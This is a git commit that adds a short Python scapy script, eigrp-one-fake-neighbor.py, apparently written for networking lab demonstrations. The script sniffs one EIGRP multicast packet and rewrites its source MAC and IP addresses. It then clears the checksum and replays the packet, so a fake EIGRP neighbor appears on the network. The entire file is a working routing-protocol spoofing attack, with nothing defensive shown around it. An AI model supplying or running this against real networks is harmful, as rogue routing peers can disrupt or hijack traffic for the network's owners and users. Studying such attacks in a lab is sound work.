a78988b5b9c353363b5482f2196562e61112a2cf
davidbombal <davidbombal@gmail.com>
2021-08-18 11:09:20 +0100

    Create eigrp-one-fake-neighbor.py

---
+++ eigrp-one-fake-neighbor.py
@@ -0,0 +1,16 @@
+#!/usr/bin/env python3
+#Add fake EIGRP neigbor, one packet
+#Import scapy
+from scapy.all import *
+#Import EIGRP
+load_contrib('eigrp')
+#Sniff for an EIGRP packet
+pkt = sniff(filter="ip dst 224.0.0.10",count=1)
+#Change the source MAC address
+pkt[0].src="00:00:00:11:11:11"
+#Change the source IP address
+pkt[0][IP].src="192.168.122.123"
+#Change Checksum
+pkt[0][IP].chksum=None
+#Send packet into network
+sendp(pkt[0], loop=0, verbose=1)
